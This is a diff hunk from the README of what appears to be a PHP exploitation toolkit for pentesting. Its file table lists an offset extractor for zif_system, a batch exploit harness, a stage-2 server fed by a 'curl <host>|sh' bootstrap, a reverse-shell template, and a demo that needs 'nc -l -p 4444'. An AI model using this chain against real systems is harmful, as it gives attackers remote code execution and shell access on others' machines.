@@ -11,8 +11,8 @@ guidance.
 | `extract_offsets.py` | Operator calibration tool. Pulls `zif_system` + `zval_ptr_dtor` from any `libphp.so` or `php-fpm` binary via a `zend_function_entry` scan. |
 | `php2sweep.py` | Batch probe/exploit/report harness for internal pentest scope. Supports CIDR, nmap XML, scope lists. |
 | `serve_stage2.py` | HTTP server for the arbitrary-length stage-2 payload the `curl <host>\|sh` bootstrap fetches. |
-| `listener.py` | Minimal callback listener for stage-2 confirmation. |
 | `stage2.sh` | Template reverse-shell payload (edit `LHOST`/`LPORT` before use). |
+| `demo.sh` + `demo.ini` | Fresh-container to interactive reverse shell demo (run `nc -l -p 4444` first). |
 | `CREDITS.md` | Attribution for upstream lineage. |
 
 ## Quick start
